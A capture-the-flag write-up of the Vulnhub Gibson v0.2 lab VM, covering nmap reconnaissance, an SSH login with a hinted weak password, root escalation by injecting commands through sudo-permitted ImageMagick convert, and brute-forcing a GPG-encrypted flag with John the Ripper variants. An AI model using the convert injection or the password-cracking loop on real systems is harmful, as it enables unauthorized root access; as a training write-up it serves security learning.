###### Description: Writeup of Gibson v0.2 VM in Vulnhub by the author knightmare

Let's begin by scanning the host: 

```
# nmap -A -T4 -p- -sV -PN 172.16.16.139

Nmap scan report for 172.16.16.139
Host is up (0.00034s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 fb:f6:d1:57:64:fa:38:66:2d:66:40:12:a4:2f:75:b4 (DSA)
|   2048 32:13:58:ae:32:b0:5d:b9:2a:9c:87:9c:ae:79:3b:2e (RSA)
|_  256 3f:dc:7d:94:2f:86:f1:83:41:db:8c:74:52:f0:49:43 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Index of /
MAC Address: 00:0C:29:93:2C:13 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.19
Network Distance: 1 hop
Service Info: Host: gibson.example.co.uk; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.34 ms 172.16.16.139

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2397.79 seconds
```

So we discovered it has the following services running:
- SSH (22/tcp)
- HTTP (80/tcp)

Not too much information so let's check what we can find in HTTP services. By the "Index of /" we can assume it might be a unconfigured Apache Server. Inspecting the website we find an Apache with Indexes configured showing us a file called "davinci.html" in a Ubuntu server.

Let's see what this file can show us. OK, now we've got the message

```
The answer you seek will be found by brute force
```

Just for the sake of it, i've also inspected "davinci.html" code, and we have the following content: 

```
<html>
<title>Gibson Mining Corporation</title>
<body>
<!-- Damn it Margo! Stop setting your password to "god" -->
<!-- at least try and use a different one of the 4 most -->
<!-- common ones! (eugene) -->
<h1> The answer you seek will be found by brute force</h1>
</body>
```

Well, we found only HTTP and SSH services running, so I assume we have to bruteforce the SSH service. Once we already have a password, let's try to manuall SSH into the server using user root and the five most common passwords around, which are "god", "secret", "love", etc ...

Let's try Hydra only with 'root' user and a password list (which contains the passwords above):

```
# hydra -l root -P /usr/share/metasploit-framework/data/john/wordlists/common_roots.txt 172.16.16.139 ssh
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-05-23 18:58:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 64 tasks, 4724 login tries (l:1/p:4724), ~4 tries per task
[DATA] attacking service ssh on port 22
[ERROR] target ssh://172.16.16.139:22/ does not support password authentication.
```

OK, Hydra told us that this host does not accept password authentication, so it is probably accepting certificate authentication. Let's quickly ensure this information is right by trying to ssh into it and analyze the error message:

```
ssh root@172.16.16.139
The authenticity of host '172.16.16.139 (172.16.16.139)' can't be established.
ECDSA key fingerprint is 3f:dc:7d:94:2f:86:f1:83:41:db:8c:74:52:f0:49:43.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.16.139' (ECDSA) to the list of known hosts.
Ubuntu 14.04.3 LTS
Permission denied (publickey).
```

OK, there we have it, our confirmation. This host does not accept password authentication. But MAYBE it does not accept passwords for root users not for others.

Do you remember what the message said "... Damn it Margo ...", so I would suspect that Margo could be our username to test. Let's give it a try with password 'god'

```
# ssh margo@172.16.16.139
Ubuntu 14.04.3 LTS
margo@172.16.16.139's password: 
Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue May 24 00:11:58 BST 2016

  System load: 0.0               Memory usage: 4%   Processes:       168
  Usage of /:  82.2% of 1.85GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

margo@gibson:~$ 
```

Now we have it, we managed to get in with a least privileged user "margo". 

Let's check what users we have 

```
margo@gibson:/var/www/html$ ls /home
duke  eugene  margo
```

Ok, we have "duke", "eugene" and "margo" (the one we are using). The user "margo" has access to the other user's home directories, inspecting other user's home directory files, found nothing really interesting.

Let's check if we can find some file with flag name in it: 

```
margo@gibson:/$ find / -name *flag* 2> /dev/null
/sys/devices/pnp0/00:05/tty/ttyS0/flags
/sys/devices/pnp0/00:06/tty/ttyS1/flags
/sys/devices/pci0000:00/0000:00:11.0/0000:02:00.0/net/eth0/flags
/sys/devices/system/cpu/cpu0/microcode/processor_flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/vnet0/flags
/sys/devices/virtual/net/vnet0/tun_flags
/sys/devices/virtual/net/virbr0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/usr/lib/perl/5.18.2/bits/waitflags.ph
/usr/src/linux-headers-3.19.0-25/scripts/coccinelle/locks/flags.cocci
/usr/src/linux-headers-3.19.0-25/arch/ia64/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/frv/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/openrisc/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/alpha/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/blackfin/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/unicore32/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/nios2/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/microblaze/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/mn10300/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/s390/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/metag/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/score/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/cris/include/arch-v32/arch/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/cris/include/arch-v10/arch/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/cris/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/tile/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/avr32/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/hexagon/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/sparc/include/asm/irqflags_64.h
/usr/src/linux-headers-3.19.0-25/arch/sparc/include/asm/irqflags_32.h
/usr/src/linux-headers-3.19.0-25/arch/sparc/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/arm64/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/arc/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/xtensa/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/x86/include/uapi/asm/processor-flags.h
/usr/src/linux-headers-3.19.0-25/arch/x86/include/asm/processor-flags.h
/usr/src/linux-headers-3.19.0-25/arch/x86/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/x86/kernel/cpu/mkcapflags.sh
/usr/src/linux-headers-3.19.0-25/arch/m68k/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/sh/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/m32r/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/powerpc/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/arm/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/c6x/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/parisc/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/um/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/arch/mips/include/asm/irqflags.h
/usr/src/linux-headers-3.19.0-25/include/asm-generic/irqflags.h
/usr/src/linux-headers-3.19.0-25/include/uapi/linux/tty_flags.h
/usr/src/linux-headers-3.19.0-25/include/uapi/linux/kernel-page-flags.h
/usr/src/linux-headers-3.19.0-25/include/trace/events/gfpflags.h
/usr/src/linux-headers-3.19.0-25/include/linux/page-flags-layout.h
/usr/src/linux-headers-3.19.0-25/include/linux/page-flags.h
/usr/src/linux-headers-3.19.0-25/include/linux/pageblock-flags.h
/usr/src/linux-headers-3.19.0-25/include/linux/irqflags.h
/usr/src/linux-headers-3.19.0-25/include/linux/kernel-page-flags.h
/usr/src/linux-headers-3.19.0-25-generic/include/config/trace/irqflags
/usr/src/linux-headers-3.19.0-25-generic/include/config/arch/hweight/cflags.h
/usr/src/linux-headers-3.19.0-25-generic/include/config/zone/dma/flag.h
/usr/src/linux-headers-3.19.0-25-generic/include/config/pageflags
/usr/include/X11/bitmaps/flagdown
/usr/include/X11/bitmaps/flagup
```

OK, we have found some files with flag name in it, but checking all of them, they really have nothing interesting.

Let's keep on, let's try to check what kind of commands we can try to execute as root: 

```
margo@gibson:~$ sudo -l
Matching Defaults entries for margo on gibson:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User margo may run the following commands on gibson:
    (ALL) NOPASSWD: /usr/bin/convert
```

Well, it appears that only command "/usr/bin/convert" can be used as root. This commands relates to ImageMagick. After some Googling i've found some problems with convert. It seems it can't handle escape commands properly, which means we can use it to try to escape any command with a ";" and execute another right after the first one. So it seems to be vulnerable to the recent ImageMagick RCE vulnerability in the image decoder.

Let's try to execute some commands using "convert" and see what permissions they are created from:

```
margo@gibson:~$ sudo /usr/bin/convert 'https://127.0.0.1"|id > test.txt"' out.png
convert: unable to open image `/tmp/magick-v4yeb6YW': No such file or directory @ error/blob.c/OpenBlob/2638.
convert: unable to open file `/tmp/magick-v4yeb6YW': No such file or directory @ error/constitute.c/ReadImage/583.
convert: no images defined `out.png' @ error/convert.c/ConvertImageCommand/3044.
margo@gibson:~$ cat test.txt 
uid=0(root) gid=0(root) groups=0(root)
```

OK, we can see that we created a file called test.txt with the output of the "id" command. We can see that the local privilege escalation worked for this command as user "root". So let's try to execute VIM, which supposedly would be run as root as well.

```
margo@gibson:~$ sudo /usr/bin/convert 'https://127.0.0.1";vim"' out.png
```

BINGO !!! Now we have vim running, now let's try to call a shell inside vim issuing the following command inside vim: 

```
:!/bin/bash

root@gibson:~# whoami
root
```

Hurrayyy !! Now we've got root. OK. Let's look search for the FLAG !!!

Checked the /root directory but found nothing interesting there, as it was supposed to be. Just remembered what "knightmare" said: "The flag is not where you expect to find it.". That should be /root directory, so let's check again for files with the word "flag" in the name:

```
root@gibson:/root# find / -name *flag*
```

Again nothing interesting. Well, the flag could as well be in low privilege user's directories. I just remembered that the other users have some directories I didn't have permission to check. Let's check them.

OK, found nothing on normal user's directories. So it's time to check for services running:

```
root@gibson:~# netstat -atunpl
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      1401/dnsmasq    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1119/sshd       
tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      1423/qemu-system-x8
tcp        0      0 172.16.16.139:22        172.16.16.1:57911       ESTABLISHED 1466/sshd: margo [p
tcp6       0      0 :::22                   :::*                    LISTEN      1119/sshd       
tcp6       0      0 :::80                   :::*                    LISTEN      1266/apache2    
udp        0      0 192.168.122.1:53        0.0.0.0:*                           1401/dnsmasq    
udp        0      0 0.0.0.0:67              0.0.0.0:*                           1401/dnsmasq    
udp        0      0 0.0.0.0:68              0.0.0.0:*                           910/dhclient    
udp        0      0 0.0.0.0:55622           0.0.0.0:*                           910/dhclient    
udp6       0      0 :::56299                :::*                                910/dhclient
```

OK, we have a "DNS", "VNC", "DHCP", "SSH" and also an "HTTP" running, all listening to external connections. 

Let's check then for processes running:

```
root@gibson:/# ps auxf

... snip ...

root      1124  0.0  0.1   4372  1632 ?        Ss   14:33   0:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
root      1167  0.0  0.4 163640  7016 ?        Sl   14:33   0:02 /usr/bin/vmtoolsd
root      1170  0.0  1.3 372644 20328 ?        Sl   14:33   0:00 /usr/sbin/libvirtd -d
root      1266  0.0  1.3 188556 20584 ?        Ss   14:33   0:00 /usr/sbin/apache2 -k start
www-data  1285  0.0  0.4 188580  6900 ?        S    14:33   0:00  \_ /usr/sbin/apache2 -k start
www-data  1286  0.0  0.4 188580  6900 ?        S    14:33   0:00  \_ /usr/sbin/apache2 -k start
www-data  1287  0.0  0.4 188580  6900 ?        S    14:33   0:00  \_ /usr/sbin/apache2 -k start
www-data  1288  0.0  0.4 188580  6900 ?        S    14:33   0:00  \_ /usr/sbin/apache2 -k start
www-data  1289  0.0  0.4 188580  6900 ?        S    14:33   0:00  \_ /usr/sbin/apache2 -k start
libvirt+  1401  0.0  0.1  28212  2244 ?        S    14:33   0:00 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default.conf
libvirt+  1423  0.6  7.5 841876 113524 ?       Sl   14:33   0:22 /usr/bin/qemu-system-x86_64 -name ftpserv -S -machine pc-i440fx-trusty,accel=tcg,usb=off -m 256 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid ebcdaa6
root      1451  0.0  0.1  15824  2080 tty1     Ss+  14:33   0:00 /sbin/getty -8 38400 tty1
```

I've noticed that there is a qemu running a virtual machine called "ftpserv", but what kind of VM is that. What we can do is try to figure where the image is in the system: 

```
root@gibson:/# find / -name *ftpserv*
/sys/fs/cgroup/perf_event/machine/ftpserv.libvirt-qemu
/sys/fs/cgroup/blkio/machine/ftpserv.libvirt-qemu
/sys/fs/cgroup/net_cls/machine/ftpserv.libvirt-qemu
/sys/fs/cgroup/freezer/machine/ftpserv.libvirt-qemu
/sys/fs/cgroup/devices/machine/ftpserv.libvirt-qemu
/sys/fs/cgroup/memory/machine/ftpserv.libvirt-qemu
/sys/fs/cgroup/cpuacct/machine/ftpserv.libvirt-qemu
/sys/fs/cgroup/cpu/machine/ftpserv.libvirt-qemu
/sys/fs/cgroup/cpuset/machine/ftpserv.libvirt-qemu
/etc/libvirt/qemu/autostart/ftpserv.xml
/etc/libvirt/qemu/ftpserv.xml
/var/log/libvirt/qemu/ftpserv.log
/var/lib/libvirt/qemu/ftpserv.monitor
/var/lib/libvirt/images/ftpserv.img
/run/libvirt/qemu/ftpserv.xml
/run/libvirt/qemu/ftpserv.pid
```

OK, found some information on this machine, including the VM image which is in "/var/lib/libvirt/images/ftpserv.img". Everything seems to lead us to find the flag inside this machine, so I've copied the image to my host to check it.

Let's now obtain some more information on the qemu VM filesystem:

```
# fdisk -l ftpserv.img 

Disk ftpserv.img: 536 MB, 536870912 bytes
16 heads, 63 sectors/track, 1040 cylinders, total 1048576 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk identifier: 0x00000000

      Device Boot      Start         End      Blocks   Id  System
ftpserv.img1   *          63     1048319      524128+   e  W95 FAT16 (LBA)
```

OK, we can see that the image file has just one FAT16 partitition marked as Boot. So let's try to mount it

```
# losetup /dev/loop0 ftpserv.img 
# kpartx -a /dev/loop0
# mount /dev/mapper/loop0p1 /media/strider/KFYLNN/
# cd /media/strider/KFYLNN/
# ls -l
total 168
-rwxr-xr-x  1 strider strider  1328 May  4 20:57 AUTOEXEC.BAT
-rw-r--r--  1 strider strider   512 May  4 19:15 BOOTSECT.BIN
-rwxr-xr-x  1 strider strider 66945 Aug 28  2006 COMMAND.COM
drwx------ 11 strider strider  8192 May  4 19:08 DOS
-rw-r--r--  1 strider strider   836 May  4 19:15 FDCONFIG.SYS
drwx------  2 strider strider  8192 May  4 21:03 GARBAGE
-rw-r--r--  1 strider strider 45344 Jun 21  2011 KERNEL.SYS
drwx------  2 strider strider  8192 May  4 20:46 net

```

OK, now with the img file mounted, just for the sake of it, let's inspect for files that has the word "flag" in the name:

```
# find . -name *flag*
./GARBAGE/flag.img
```

OK, now i've just found another img file. GOSH !!! It seems to be a EXT2 file system file: 

```
# file GARBAGE/flag.img 
GARBAGE/flag.img: Linux rev 1.0 ext2 filesystem data, UUID=d59bdd40-ec37-4d24-a956-80f549846121
```

Let's try to mount it and see what we've got.

```
thegrid GARBAGE # mount -t ext2 flag.img /mnt/test/ -o loop
thegrid GARBAGE # ls /mnt/test/
davinci  davinci.c  hint.txt  lost+found
```

Ok, now we have other files. Immediatelly I see a "hint.txt" with the following content:

```
http://www.imdb.com/title/tt0117951/ and
http://www.imdb.com/title/tt0113243/ have
someone in common... Can you remember his
original nom de plume in 1988...?
```

Checked very quickly the two IMDB URLs provided. I've never seen the first movie, but the second I know very well as one of the worst hacking movies of all times :). Well, it seems they have one actor in common, "John Lee Miller", which is the character "Zero Cool" in Hackers.

OK, at this momment I really don't know what to think of this, so let's keep going on checking the other files around.

The file "adminspo.jpg" there is a message about choosing "sysmadmin". Maybe we can use it as an user for some bruteforcing. Let's keep on.

By using command strings on the file "jz_ug.ans", the only understandable information we can find is the sentence below

```
# strings jz_ug.ans

... snip ...

9;1H
[20Cthe ugliest of all are under 5 
[ufeet tall

```

OK, enough of this. Let me check if there is another file with the word "flag" in it in our newly mounted image "flag.img" which is in "/mnt/test" directory:

```
# find . -name *flag*
./.trash/flag.txt.gpg
```

AHA !! Now we are talking. This seems to be the file that contains the flag, but it's encrypted. So maybe we have to use our "zerocool" name as a password to decrypt the file.

After a little Googling and GPG man pages I've came up with a string that could potentially decrypt our file if we provide it the correct passphrase, and write the output in another file.

```
# gpg --output flag.txt --passphrase <PASS> --decrypt flag.txt.gpg
```

Let's try this command manually with some password file with the following content: 

```
zerocool
zerokool
Zerokool
ZeroKool
Zerocool
zero cool
Zero Cool
zero Kool
Zero kool
zero kool

... snip ...
```
... and other similar passwords and gpg to unencrypt it. OK, nothing happened, so maybe we will have to bruteforce it. The only right information we have is that the password is definitelly some variation of "zero cool", maybe spaces capitalization, l33t, etc.

Let's create a password.txt file with the same password content tested by hand and use john to perform some transformations for us to generate another password.txt file.

```
# /opt/pentest/cracking/softs/jtr/john-1.8.0-jumbo-1/run/john --rules=KoreLogicRulesL33t --wordlist=password.txt --stdout > zerocoolpass.txt
Press 'q' or Ctrl-C to abort, almost any other key for status
525p 0:00:00:00 100.00% (2016-05-25 10:59) 5250p/s Z3r0 k001
```

OK, now we have 525 variations of zero cool with and without space using L33T transformation, in file "zerocoolpass.txt". I'd say it's a good start.

Let's use a very quick and ugly for command in bash prompt to go through our password file and using the same gpg command we used before:

```
# for i in $(cat zerocoolpass.txt); do gpg --output flag.txt --passphrase $i --decrypt flag.txt.gpg; done
```

Voilá !!!! There it is, our flag.

```
# cat flag.txt
 _   _            _      _____ _             ____  _                  _   _
| | | | __ _  ___| | __ |_   _| |__   ___   |  _ \| | __ _ _ __   ___| |_| |
| |_| |/ _` |/ __| |/ /   | | | '_ \ / _ \  | |_) | |/ _` | '_ \ / _ \ __| |
|  _  | (_| | (__|   <    | | | | | |  __/  |  __/| | (_| | | | |  __/ |_|_|
|_| |_|\__,_|\___|_|\_\   |_| |_| |_|\___|  |_|   |_|\__,_|_| |_|\___|\__(_)


Should you not be standing in a 360 degree rotating payphone when reading
this flag...? B-)

Anyhow, congratulations once more on rooting this VM. This time things were
a bit esoteric, but I hope you enjoyed it all the same.

Shout-outs again to #vulnhub for hosting a great learning tool. A special
thanks goes to g0blin and GKNSB for testing, and to g0tM1lk for the offer
to host the CTF once more.
                                                              --Knightmare
```

I hope it can help you on your journey to the "source' :)

See ya
